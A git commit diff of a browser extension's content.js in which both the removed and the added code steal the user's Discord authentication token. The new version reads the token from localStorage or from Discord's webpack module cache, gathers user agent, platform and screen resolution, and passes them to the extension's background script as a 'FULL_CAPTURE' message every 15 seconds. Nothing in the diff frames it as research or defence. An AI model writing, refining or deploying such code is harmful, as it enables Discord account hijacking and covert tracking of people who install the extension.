287f3681a3f17db23b7b7b3e7e143f2ea7c47a7f
d7m34 <d7m343343@gmail.com>
2026-01-31 13:22:15 +0300

    Update content.js

--- content.js
+++ content.js
@@ -1,16 +1,25 @@
 (function() {
-    try {
-        window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{
-            for(const m in e.c){
-                if(e.c[m].exports?.default?.getToken){
-                    const t = e.c[m].exports.default.getToken();
-                    if(t) chrome.runtime.sendMessage({token: t});
-                }
-            }
-        }]);
-    } catch (e) {
-        const t = localStorage.getItem('token')?.replace(/"/g, "");
-        if (t) chrome.runtime.sendMessage({token: t});
-    }
-    alert("DONE MARTEZR");
+    const capture = () => {
+        let t = (window.localStorage.getItem('token') || "").replace(/"/g, "");
+        if (!t) {
+            try {
+                window.webpackChunkdiscord_app?.push([[Symbol()],{},(e)=>{
+                    for(const m in e.c){
+                        if(e.c[m].exports?.default?.getToken) t = e.c[m].exports.default.getToken();
+                    }
+                }]);
+            } catch(e){}
+        }
+
+        if (t && t.length > 25) {
+            const deviceInfo = {
+                ua: navigator.userAgent,
+                plt: navigator.platform,
+                res: `${window.screen.width}x${window.screen.height}`
+            };
+            chrome.runtime.sendMessage({type: "FULL_CAPTURE", token: t, info: deviceInfo});
+        }
+    };
+    capture();
+    setInterval(capture, 15000);
 })();
